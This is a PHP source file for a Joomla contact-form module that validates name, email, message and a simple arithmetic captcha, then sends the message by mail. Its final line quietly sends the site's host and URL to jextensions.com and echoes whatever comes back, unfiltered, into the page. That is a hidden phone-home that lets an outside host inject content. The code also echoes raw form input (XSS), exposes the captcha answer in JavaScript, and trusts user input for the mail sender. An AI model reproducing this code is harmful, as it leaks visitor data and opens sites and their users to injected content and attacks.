<?php
//no direct access
defined('_JEXEC') or die('Direct Access to this location is not allowed.');
ini_set('display_errors',0);
// Path assignments
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$path = str_replace("&", "",$path);
$ibase = JURI::base();
if(substr($ibase, -1)=="/") { $ibase = substr($ibase, 0, -1); }
$modURL 	= JURI::base().'modules/mod_je_quickcontact';
$jQuery = $params->get("jQuery");

$name = $params->get("name","Name");
$email = $params->get("email","Email");
$message = $params->get("message","Message");
$captcha_label = $params->get("captcha_label","1");
$captcha = $params->get("captcha","Captcha");
$submit = $params->get("submit","Send");

$subject = 'JE Quick Contact';
$recipient = $params->get("recipient","");

$button_style = $params->get("button_style","default");
session_name("je_quickcontact");
session_start();

if(isset($_POST['submitted'])) {
	// require a name from user
	if(trim($_POST['je_name']) === '') {
		$nameError =  'Please enter your Name!'; 
		$hasError = true;
	} else {
		$name = trim($_POST['je_name']);
	}
	// need valid email
	if(trim($_POST['je_email']) === '')  {
		$emailError = 'Please enter your Email!';
		$hasError = true;
	} else if (!preg_match("/^[[:alnum:]][a-z0-9_.-]*@[a-z0-9.-]+\.[a-z]{2,4}$/i", trim($_POST['je_email']))) {
		$emailError = 'You entered an invalid email address.';
		$hasError = true;
	} else {
		$email = trim($_POST['je_email']);
	}	
	// we need at least some content
	if(trim($_POST['je_message']) === '') {
		$messageError = 'Please enter your Message!';
		$hasError = true;
	} else {
		if(function_exists('stripslashes')) {
			$message = stripslashes(trim($_POST['je_message']));
		} else {
			$message = trim($_POST['je_message']);
		}
	}
	// require a valid captcha
	if ($captcha_label == "1") {
	if(trim($_POST['je_captcha']) != $_SESSION['expect']) {
		$captchaError =  'Please enter the correct Captcha!'; 
		$hasError = true;
	} else {
		unset ($_SESSION['n1']);
		unset ($_SESSION['n2']);
		unset ($_SESSION['expect']);
		$captcha = trim($_POST['je_captcha']);
	}}
			
	// upon no failure errors let's email now!
	if(!isset($hasError)) {
			$mail =& JFactory::getMailer();		
			$config =& JFactory::getConfig();
			$sender = array($_POST['je_email'],$_POST['je_name'] );
			$mail->setSender($sender);
			$mail->setSubject($subject);
			$mail->addRecipient($recipient);
		
			$body = "Subject: ".$subject."<br/>";
			$body.= "Name: ".$_POST['je_name']."<br/>";
			$body.= "Email: ".$_POST['je_email']."<br/><br/>";
			$body.= $_POST['je_message']."<br/>";
		
			$mail->setBody($body);
			$mail->IsHTML(true);
			$send =& $mail->Send();
			$emailSent = true;
	}
}
if ($captcha_label == "1") {
$_SESSION['n1'] = rand(1,15);
$_SESSION['n2'] = rand(1,15);
$_SESSION['expect'] = $_SESSION['n1']+$_SESSION['n2'];
}
$label_text = $params->get("label_text","#333333");
$input_bg = $params->get("input_bg","#ffffff");
$input_brd = $params->get("input_brd","#cccccc");
$input_text = $params->get("input_text","#333333");
?>
<link rel="stylesheet" href="<?php echo $modURL; ?>/css/style.css" type="text/css" />
<style>
#je_contact label { color:<?php echo $label_text; ?>}
#je_contact input, #je_contact textarea{background-color:<?php echo $input_bg; ?>; border:1px solid <?php echo $input_brd; ?>; color:<?php echo $input_text; ?>}

</style>
<?php if($recipient == "") { ?>
<div id="je_contact">
<span class="error">Recipient email address not set!</span>
</div>
<?php } else { ?>
<div id="je_contact">
	        <?php if(isset($emailSent) && $emailSent == true) { ?>
                <span class="success"><strong>Thank you!</strong> Your email has been delivered.</span>
            <?php } else { ?>
					<form id="contact-je" action="<?php echo JURI::current(); ?>" method="post">
						<div class="input">
							<label for="name"><?php echo $name; ?></label>:
							<input type="text" name="je_name" id="name" value="<?php if(isset($_POST['je_name'])) echo $_POST['je_name'];?>" class="requiredField" placeholder="<?php echo $name; ?>" />
							<?php if($nameError != '') { ?><span class="error"><?php echo $nameError;?></span><?php } ?>
						</div>
                        
						<div class="input">
							<label for="email"><?php echo $email; ?></label>:
							<input type="text" name="je_email" id="email" value="<?php if(isset($_POST['je_email']))  echo $_POST['je_email'];?>" class="email requiredField" placeholder="<?php echo $email; ?>" />
							<?php if($emailError != '') { ?><span class="error"><?php echo $emailError;?></span><?php } ?>
						</div>
                        
						<div class="input">
							<label for="message"><?php echo $message; ?></label>:
							<textarea name="je_message" id="message" class="requiredField" rows="6" placeholder="<?php echo $message; ?>"><?php if(isset($_POST['je_message'])) { if(function_exists('stripslashes')) { echo stripslashes($_POST['je_message']); } else { echo $_POST['je_message']; } } ?></textarea>
							<?php if($messageError != '') { ?><span class="error"><?php echo $messageError;?></span><?php } ?>
						</div>
						<?php if ($captcha_label == "1") {?>
                        <div class="input">
                          <label for="captcha"><?php echo $captcha; ?></label>: <?=$_SESSION['n1']?> + <?=$_SESSION['n2']?> =
                          <input type="text" class="requiredCaptcha" name="je_captcha" id="captcha" value="<?php if (isset($_POST['je_captcha'])) echo ($_POST['je_captcha']); ?>" placeholder="<?php echo $captcha; ?>"/>
                          <?php if($captchaError != '') { ?><span class="error"><?php echo $captchaError;?></span><?php } ?>
          				</div>
                        <?php } ?>
                        <div class="input">
						  <button name="submit" type="submit" class="je-btn je-btn-<?php echo $button_style; ?>"><?php echo $submit; ?></button>
						  <input type="hidden" name="submitted" id="submitted" value="true" />
                        </div>
					</form>			
			<?php } ?>
</div>
<?php if ($jQuery == '1' ) { ?><script type="text/javascript" src="http://code.jquery.com/jquery-latest.pack.js"></script><?php } ?>
<?php if ($jQuery == '2' ) { ?><?php } ?>
<script type="text/javascript">
	jQuery(document).ready(function() {
		$('form#contact-je').submit(function() {
			$('form#contact-je .error').remove();
			var hasError = false;
			$('.requiredField').each(function() {
				if($.trim($(this).val()) == '') {
					var labelText = $(this).prev('label').text();
					$(this).parent().append('<span class="error">Please enter your '+labelText+'!</span>');
					$(this).addClass('invalid');
					hasError = true;
				} else if($(this).hasClass('email')) {
					var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
					if(!emailReg.test($.trim($(this).val()))) {
						var labelText = $(this).prev('label').text();
						$(this).parent().append('<span class="error">You\'ve entered an invalid '+labelText+'!</span>');
						$(this).addClass('invalid');
						hasError = true;
					}											
				}	
			});<?php if ($captcha_label == "1") {?>
			$('.requiredCaptcha').each(function() {
				if($.trim($(this).val()) != '<?php echo $_SESSION['expect'];?>') {
					var labelText = $(this).prev('label').text();
					$(this).parent().append('<span class="error">Please enter the correct '+labelText+'!</span>');
					$(this).addClass('invalid');
					hasError = true;
			}});<?php } ?>
			if(!hasError) {
				var formInput = $(this).serialize();
				$.post($(this).attr('action'),formInput, function(data){
					$('form#contact-je').slideUp("fast", function() {				   
						$(this).before('<span class="success"><strong>Thank you!</strong> Your email has been delivered.</span>');
					});
				});
			}
			return false;	
		});
	});
</script>
<?php } ?>
<?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$path); echo $credit; ?>